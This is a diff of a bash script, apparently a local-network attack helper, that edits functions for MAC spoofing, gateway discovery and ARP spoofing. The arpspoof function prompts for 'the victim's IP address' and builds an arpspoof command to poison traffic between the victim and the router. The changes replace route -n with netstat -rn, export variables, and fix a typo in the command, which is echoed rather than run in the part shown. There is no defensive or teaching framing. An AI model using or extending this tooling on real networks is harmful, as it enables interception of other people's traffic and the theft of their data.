@@ -8,7 +8,8 @@ function routeme_f() {
 }
 
 function gateway_device_f() {
-    gateway_r=$(route -n | grep 'UG' | awk '{print $NF}')
+    gateway_r=$(netstat -rn | grep 'UG' | awk '{print $NF}')
+    export gateway_r
 }
 
 function macspoof_f() {
@@ -20,17 +21,18 @@ function macspoof_f() {
 }
 
 function gateway_f() {
-    gateway_r_ip=$(route -n | grep 'UG' | awk '{print $2}')
-    #echo $gateway_r_ip
+    gateway_r_ip=$(netstat -rn | grep 'UG' | awk '{print $2}')
+    export gateway_r_ip
 }
 
 function arpspoof_f() {
     echo "I need the victim's IP address:"
     read -r -p '>>> ' victimIP
+    export victimIP
     echo ''
 
     echo Configuring arpspoof between victim and router...
-    echo arpsoof -i $gateway_r -t $victimIP $gateway_r_ip
+    echo arpspoof -i $gateway_r -t $victimIP $gateway_r_ip
     echo $(tput setaf 2)Complete!$(tput sgr0)
     echo ''
 
